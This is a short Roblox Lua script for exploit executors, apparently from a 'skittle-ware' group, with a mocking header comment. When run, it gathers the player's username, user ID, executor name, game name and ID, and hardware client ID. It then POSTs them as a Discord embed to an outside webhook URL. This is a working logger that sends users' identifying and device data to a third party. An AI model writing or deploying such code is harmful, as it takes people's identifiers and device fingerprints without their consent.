--[[
     open source because without open source it wouldnt work properly LOLZ
     oh btw u cant delete the webhook, go ahead and try ill venmo u 50$
--]]


local a={["content"]=nil,["embeds"]={{["title"]="New log!",["description"]="**🎭 Username:** "..game.Players.LocalPlayer.Name.." ("..game.Players.LocalPlayer.UserId..") \n **💸 Exploit:** "..identifyexecutor().."\n **🎮 Game: ** "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.." ("..game.PlaceId..") \n **🔨 HWID: ** "..game:GetService("RbxAnalyticsService"):GetClientId(),["type"]="rich",["color"]=tonumber(0x34c3eb),["footer"]={["text"]="discord.gg/skittle-ware"},["image"]={["url"]="https://images-ext-2.discordapp.net/external/ROvB0sX6JkGsxWUYI4EQODXg1b5GnKOUWwhRAC57CB8/https/i.pinimg.com/originals/f0/c2/30/f0c230a5b8486bf855b03773b5256d03.gif?width=432&height=242"}}}}local b=game:GetService("HttpService"):JSONEncode(a)local c={["content-type"]="application/json"}request=http_request or request or HttpPost or syn.request;local d={Url=getgenv().URL,Body=b,Method="POST",Headers=c}request(d)
